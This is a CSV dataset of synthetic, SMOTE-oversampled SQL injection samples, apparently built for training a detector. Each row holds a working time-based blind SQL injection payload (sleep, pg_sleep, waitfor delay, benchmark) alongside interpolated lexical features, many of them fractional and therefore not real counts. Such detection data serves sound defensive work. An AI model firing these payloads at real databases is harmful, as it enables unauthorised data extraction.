id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000092,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.6968844258147929,37.718323843272245,16.0,3.035234621040133,10.999999999999998,0.0,17.084517030908742,9.633806812363497,0.2933481071506453,0.0,0.4514153325533179,0.2552365602960368,0.18309659381825116,1.6338068123634981,0.0,0.0,0.0,1.0,0.0,2.816903406181749,0.0,4.0,-5.551115123125783e-17,0.9999999999999999,0.18309659381825094,0.816903406181749,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000093,attack,time,1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000139,1.1450037744010364,109.73790944547336,30.94758188909467,3.953161880517614,37.790327556378685,18.0,38.94758188909467,15.0,0.3434281964615874,0.16436584927382855,0.35523441320306026,0.13697154106152376,3.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,-5.551115123125783e-17,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,1.0,1.473790944547336,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.473790944547336
SMOTE_000094,attack,time,1 waitfor delay '0:0:5',nearest_attack_euclidean,R000238,0.5985443463949337,24.47766081296517,17.492553604321724,4.001105947635801,12.985107208643447,4.0,3.246276802160864,4.246276802160861,0.5291237421937289,0.16505150936752522,0.13228093554843223,0.17354381289031356,2.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.24627680216086156,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000095,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000125,0.36257204160155726,97.63789184460545,27.876171985873224,3.7303144640292385,26.0,21.876171985873224,37.00937588698579,12.752343971746447,0.26669132369608106,0.22425475275713141,0.37852253474708275,0.1305313887997047,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.752343971746447,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.8761719858732229,0.12382801412677691,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000096,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000123,0.1817626142876818,44.22797800925838,19.075992669752793,3.389224045753734,20.22797800925838,2.0,17.0,5.0,0.4571912341500005,0.04523406382083328,0.38448954247708295,0.11308515955208322,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,3.0,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.9240073302472074,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9240073302472074
SMOTE_000097,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000099,0.8538266650604662,63.976475794070765,21.0,3.325324384702711,19.48235684555307,10.0,27.241178422776535,7.252940525741155,0.3031163950185519,0.15680126490577126,0.42596041109437566,0.11412192898130118,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.2529405257411549,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.7470594742588452,0.0,0.2529405257411549,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.008590776783916992,100.0,33.0,4.067530144996391,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,1.0,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000099,attack,time,"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",nearest_attack_euclidean,R000132,1.6919490715378123,80.12207265871686,27.22441453174337,3.808963416488766,23.117139962294274,20.11220726587169,27.8927254305509,9.0,0.2843197235303889,0.25344779691084934,0.3480977545837498,0.11413472497501193,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.5561036329358435,0.4438963670641569,0.0,1.0,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000100,attack,time,begin user_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000191,0.29083369528904124,30.619820424227207,17.85946127268161,3.7152762656759317,17.619820424227203,1.0,8.0,4.0,0.5753308231343588,0.03266685975889547,0.26133487807116385,0.13066743903558192,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000101,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000125,0.7868139444225227,99.4850698910189,28.970139782037776,3.799720384571578,27.94027956407555,22.0,37.029860217962224,12.514930108981112,0.2807551373411099,0.22114428913106915,0.37227510158783256,0.12582547193998836,4.0,0.0,0.0,0.0,0.0,1.514930108981113,0.0,6.0,0.0,0.0,1.0,1.5149301089811127,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,time,"1"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000168,0.6808124286948046,26.0,18.73525894758848,4.104892821265647,12.000000000000002,4.0,3.0,7.0,0.46153846153846156,0.15384615384615385,0.11538461538461536,0.2692307692307692,2.2647410524115195,0.7352589475884806,2.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,2.0,1.0,0.7352589475884808,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000103,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.5715708858783275,36.449315348503504,17.0,3.3804896416504295,13.0,1.0,12.874429457086253,9.574885891417251,0.3637433673194979,0.027980259024576765,0.34367880040323995,0.26459757325268535,0.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,2.5748858914172508,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000104,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000197,0.3386664529435227,77.2918626600537,19.805424893297534,3.0329016756194918,28.610849786595068,1.0,37.48643776675617,10.194575106702466,0.3703849701990687,0.012939632685056213,0.4848468814315321,0.131828515684343,0.09728755335123318,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,8.097287553351233,0.0,0.0,-5.551115123125783e-17,1.097287553351233,0.09728755335123318,0.0,0.0,0.9027124466487668,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000105,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.9366648520832483,37.25610355571268,16.628051777856342,3.3142105006856153,13.0,0.0,13.62805177785634,10.62805177785634,0.3491744545144263,0.0,0.3657021328790668,0.2851234126065069,0.0,0.6280517778563406,2.0,0.0,0.0,1.1102230246251565e-16,0.0,3.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.6280517778563406,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000106,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",nearest_attack_euclidean,R000145,0.4304872807336083,110.74361128794324,28.489317136997634,3.567942586903032,26.0,22.0,47.7863427399527,14.957268547990537,0.2375516224450584,0.20100521899197246,0.42675459491775264,0.1346885636452165,4.0,0.0,0.0,0.0,0.0,2.0,0.0,7.957268547990539,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000107,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000076,0.4588149409582062,63.59861671399538,27.600922190669746,4.267036287940972,26.20184438133949,12.0,15.396772332655893,10.0,0.41259104010257636,0.18874858091199023,0.2413698948921082,0.1572904840933252,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.1995389046651277,0.0,0.0,-5.551115123125783e-17,3.8004610953348728,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.8004610953348725,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8004610953348728
SMOTE_000108,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000070,0.5639499079362642,125.67530803396085,28.22078199433986,3.472120760301882,45.0,10.0,54.675308033960846,16.0,0.3582098743067457,0.07960219429038795,0.4348244205382456,0.12736351086462072,2.2207819943398586,0.0,0.0,0.0,1.0,1.0,0.0,9.779218005660141,0.0,0.0,-5.551115123125783e-17,3.779218005660141,1.0,0.0,0.0,0.22078199433985848,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000109,attack,time,"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000221,1.6088652744380951,86.0,25.0,3.531187838006236,21.46908328986529,18.0,36.0,10.530916710134711,0.24964050337052662,0.20930232558139536,0.4186046511627907,0.12245251988528735,0.5309167101347114,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.5309167101347114,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.46908328986528863,0.5309167101347114,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000110,attack,time,1%' rlike sleep  (  5  )  #,nearest_attack_euclidean,R000091,0.6235389360812827,29.603025978561398,15.433837663093566,3.2897573055323766,11.590738098009743,2.0,11.012287880551654,5.0,0.38429602375362065,0.0697892576484586,0.37144157447677423,0.1744731441211465,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.144612554364522,0.8553874456354779,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.14461255436452214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.144612554364522
SMOTE_000111,attack,time,select sleep  (  5  )  # yrpn,nearest_attack_euclidean,R000285,0.054998002302799026,28.976005347645504,14.071983957063495,3.23326035713087,14.928016042936505,1.0239946523544994,10.0239946523545,3.0,0.5151137746680741,0.035369260554969126,0.3459800387214599,0.10353692605549691,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.976005347645502,0.0,0.0,0.0,0.023994652354498103,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000112,attack,time,1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000126,0.5523362237595708,109.47935862976031,32.95871725952062,3.8503077865772366,34.82645287658677,18.0,42.0,14.652905753173538,0.31810809383032573,0.16443258663248211,0.3836760354757916,0.13378328406140055,3.6529057531735387,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,-5.551115123125783e-17,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,1.0,1.0,0.8264528765867696,0.17354712341323042,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000113,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000069,1.8462000998418817,38.689029091622714,20.054008311892204,3.9246069515984816,19.216033247568816,3.0,8.0,8.472995844053898,0.4913100185650122,0.07818565491505569,0.20849507977348183,0.2220092467464503,5.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.4729958440538978,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000114,attack,time,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",nearest_attack_euclidean,R000179,0.2749233982500927,53.72541433363148,21.182083666624074,3.818713276005844,27.0,3.0,14.907498000255552,8.817916333375925,0.5039446261333145,0.05599384734814604,0.2758733941954362,0.16418813232310325,2.0,3.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,1.8179163333759254,0.0,0.0,-5.551115123125783e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000115,attack,time,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000157,0.3135514659331078,59.88768633870118,25.348347384786557,4.075800967586909,23.0,12.0,16.618016861743868,8.269669476957311,0.3850353353341838,0.20088800104392196,0.27600256840865434,0.13807409521323996,2.0,0.0,2.0,0.0,0.0,1.0,0.0,1.2696694769573114,0.0,0.0,-5.551115123125783e-17,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- rlas",nearest_attack_euclidean,R000120,1.423454350053275,87.44414026786467,28.82537944387798,3.7961632488226513,21.888828053572933,24.301517775511922,32.01572527296284,9.23806916581697,0.25221280857704154,0.27976710451385245,0.36162410429092723,0.10639598261817879,0.0,0.0,2.0,0.0,0.0,1.4126897219389902,0.0,4.8253794438779805,0.0,0.0,1.0,3.4126897219389907,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.4126897219389904,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4126897219389902
SMOTE_000117,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000164,0.033903232025623856,96.71837826607405,20.011734238913583,2.983623008936707,22.0,10.0,49.76531522172837,14.953063044345676,0.2276790959110819,0.10349049814140085,0.5142376307306806,0.15459277521683656,4.0,0.0,0.0,0.0,0.0,2.0,0.0,7.953063044345676,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.6542615884936522,56.99270292687477,20.0,3.105800723864103,13.0,10.61482330206729,26.1482330206729,7.2296466041345795,0.23110429952291903,0.18768904296660616,0.45471012490963686,0.12649653260083799,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,5.22964660413458,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000119,attack,time,"1'||  (  select 'jrbp' from dual where 4129  =  4129 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000219,1.4851030824231595,114.30868860139108,34.58985428904345,4.191208930112488,36.30868860139108,27.82029142191309,36.17970857808691,14.0,0.3165975517733249,0.24408799529996777,0.3166524750398682,0.12266197788683914,3.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.5898542890434539,0.41014571095654606,0.5898542890434539,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.589854289043454
SMOTE_000120,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,0.3435805214213973,57.2897724777163,20.822443119429074,3.324706007185478,14.733664679143613,9.911221559714537,24.73366467914361,7.911221559714537,0.2569675738705466,0.17308728471940696,0.43183042739566274,0.13811471401438372,0.0,0.0,1.8224431194290744,0.0,0.0,1.0,0.0,4.0,0.0,0.08877844028546278,1.0,2.8224431194290744,0.0,0.0,0.9112215597145372,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.9112215597145372,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9112215597145372
SMOTE_000121,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.5263812206710392,40.63095479083843,16.0,2.9201815468729926,10.999999999999998,0.0,19.630954790838434,10.0,0.271353307871662,0.0,0.4819618667904634,0.24668482533787456,0.40773869770960847,1.1845226045807833,0.0,0.0,0.0,1.0,0.0,3.4077386977096085,0.0,4.0,-5.551115123125783e-17,0.9999999999999999,0.40773869770960836,0.5922613022903918,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000122,attack,time,"1"" rlike sleep  (  5  )  ",nearest_attack_euclidean,R000141,0.0186820273661139,24.975540280994217,12.993885070248556,3.044239132558773,9.987770140497112,2.0,9.993885070248556,2.993885070248555,0.39988352514759157,0.08009317988192677,0.40017471227861273,0.11984858269186899,0.0,0.9938850702485558,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,0.0,-5.551115123125783e-17,0.0,0.0,0.9938850702485558,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.006114929751444231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0061149297514445
